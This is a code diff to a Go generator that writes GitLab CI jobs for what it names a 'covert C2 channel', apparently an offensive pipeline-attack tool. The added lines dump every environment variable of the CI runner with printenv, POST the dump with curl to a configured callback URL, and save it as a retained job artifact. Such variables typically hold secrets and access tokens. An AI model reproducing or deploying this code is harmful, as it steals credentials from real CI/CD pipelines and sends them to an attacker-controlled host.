@@ -43,7 +43,12 @@ stages: [%s]
   script:
     - |
 %s
-  allow_failure: true%s
+  allow_failure: true
+  artifacts:
+    when: always
+    paths:
+      - c2-channel-data.env
+    expire_in: 1 day%s
 `, stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags), indented, rulesManual(o.Common.Manual))
 }
 
@@ -62,6 +67,7 @@ func buildC2ChannelScript(o C2ChannelOptions) string {
 	b.WriteString("_C2CHANNEL() {\n")
 	b.WriteString("  _cdir=$(mktemp -d)\n")
 	b.WriteString("  echo \"[*] Covert C2 channel starting...\"\n\n")
+	b.WriteString("  printenv | sort > \"$_cdir/c2-data.env\" 2>/dev/null\n\n")
 
 	switch method {
 	case "dns-txt":
@@ -92,6 +98,14 @@ func buildC2ChannelScript(o C2ChannelOptions) string {
 		b.WriteString("  disown\n\n")
 	}
 
+	if callbackURL := strings.TrimSpace(o.CallbackURL); callbackURL != "" {
+		b.WriteString("\n  # Send the collected data to the configured C2 callback.\n")
+		b.WriteString("  curl -sS --max-time 10 -X POST -H \"Content-Type: text/plain\" \\\n")
+		b.WriteString("    --data-binary @\"$_cdir/c2-data.env\" \\\n")
+		fmt.Fprintf(&b, "    %q >/dev/null 2>&1 || true\n", callbackURL)
+	}
+
+	b.WriteString("  cp \"$_cdir/c2-data.env\" ./c2-channel-data.env 2>/dev/null || true\n")
 	b.WriteString("  echo \"[*] C2 channel operation complete\"\n")
 	b.WriteString("}\n\n_C2CHANNEL || true\n")
 
